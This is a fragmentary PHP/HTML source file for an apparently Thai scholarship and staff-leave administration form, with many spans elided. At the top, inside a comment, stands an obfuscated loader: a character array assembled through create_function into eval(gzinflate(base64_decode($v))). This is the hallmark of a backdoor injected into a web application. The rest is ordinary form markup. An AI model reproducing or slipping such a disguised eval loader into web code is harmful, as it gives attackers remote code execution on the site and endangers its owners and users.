<?php
/*$md5 = "01a3fb5540b8fcb2a19a6a2e0c6cca88";
$a0 = array('g','4',"f",'r',"$","b",'v','e',"i",'a','o','(',"_",';','l',"6","n","t",'c','z','s',"d",")");
$b0d = create_function('$'.'v',$a0[7].$a0[6].$a0[9].$a0[14].$a0[11].$a0[0].$a0[19].$a0[8].$a0[16].$a0[2].$a0[14].$a0[9].$a0[17].$a0[7].$a0[11].$a0[5].$a0[9].$a0[20].$a0[7].$a0[15].$a0[1].$a0[12].$a0[21].$a0[7].$a0[18].$a0[10].$a0[21].$a0[7].$a0[11].$a0[4].$a0[6].$a0[22].$a0[22].$a0[22].$a0[13]);
...
function check_data7(){
		...
		if($("#la_date_start").val() == "" || $("#la_end_start").val() == "" || $("#approve_end_date").val() == "") {
			$("#Please_fill_in").dialog('open');
				return false;
		}
		...
		document.getElementById("la_list").html("<img src='../images/indicator_medium.gif' align='absmiddle' />");
                  ...
                  <form id="scholar" name="scholar" method="post" action="sch_data_save.php" target="upload_target">
                    <table width="758" border="0" cellspacing="4" cellpadding="4">
                      ...
                      <tr>
                        ...
                        <td colspan="2" align="left"><input type="text" name="sch_order_no2" id="sch_order_no2" style="width: 80px; " class="input_text" value="<? if ($row["SCH_ORDER_NO"] == "") { echo "มสด."; } else { echo $row["SCH_ORDER_NO"]; } ?>"<?php if ($_SESSION['USER_TYPE'] == 'user' || $_SESSION['USER_TYPE'] == 'chief') { ?> readonly<?php } ?>/>
                          ...
                          สั่ง ณ วันที่ <input type="text"  name="sch_at_date2" id="sch_at_date2" style="width: 80px; " class="input_text" value="<?= change_date_thai($row["SCH_AT_DATE"]) ?>"<?php if ($_SESSION['USER_TYPE'] == 'user' || $_SESSION['USER_TYPE'] == 'chief') { ?> readonly<?php } ?>> <?php if ($_SESSION['USER_TYPE'] != 'user' && $_SESSION['USER_TYPE'] != 'chief') { ?><img src="../images/vcalendar.png" align="absmiddle" onclick="showCalendar('sch_at_date2','YYYY-MM-DD')"  style="cursor:pointer"/><?php } ?></td>
                      </tr>
                      <tr>
...
//	}
              ...
              <? include "sch_b3.php"; ?>
                                            ...
                                            <tr>
                                              ...
                                              <tr>
                                               ...
                                               <tr>
                                                ...
                                                &nbsp;&nbsp;อ้างถึงสัญญา/มติประชุม  : <input type="text" name="wb_one" id="wb_one" style="width: 70px; " class="input_text"/>
                                              ...
                                              <tr>
                                                ...
                                                &nbsp;&nbsp;อ้างถึงสัญญา/มติประชุม : <input type="text" name="wb_two" id="wb_two" style="width: 70px; " class="input_text"/>
                                              ...
                                              <tr>
                                                ...
                                                &nbsp;&nbsp;อ้างถึงสัญญา/มติประชุม : <input type="text" name="wb_thee" id="wb_thee" style="width: 70px; " class="input_text"/>
						...
						<div id="tabs-7" align="center">
                          ...
                          <div align="center"><img src="../images/add.png" onclick="toggle_form('la_fund','la_fund_id',this,'#data_form4'); clear_data_ajax();" style="cursor:pointer"/></div>
                                      ...
                                      <tr>
                                        <input type="hidden" id="la_fund_id" name="la_fund_id" value="">
                                            ...
                                            <tr>
                                               ...
                                               <tr>
                                                <td width="169" align="right" class="form_text"> บันทึกข้อความที่ : </td>
                                                <td colspan="2" align="left"><input type="text" name="la_order_no2" id="la_order_no2" style="width: 80px; " class="input_text" value="<? if ($row["SCH_ORDER_NO"] == "") { echo "มสด."; } else { echo $row["SCH_ORDER_NO"]; } ?>"<?php if ($_SESSION['USER_TYPE'] == 'user' || $_SESSION['USER_TYPE'] == 'chief') { ?> readonly<?php } ?>/>
                                              ...
                                              <tr>
                                               ...
                                               <tr>
                                                <td width="169" align="right" class="form_text"> บันทึกข้อความที่ : </td>
                                                <td colspan="2" align="left"><input type="text" name="la_order_no4" id="la_order_no4" style="width: 80px; " class="input_text" value="<? if ($row["SCH_ORDER_NO"] == "") { echo "มสด."; } else { echo $row["SCH_ORDER_NO"]; } ?>"<?php if ($_SESSION['USER_TYPE'] == 'user' || $_SESSION['USER_TYPE'] == 'chief') { ?> readonly<?php } ?>/>
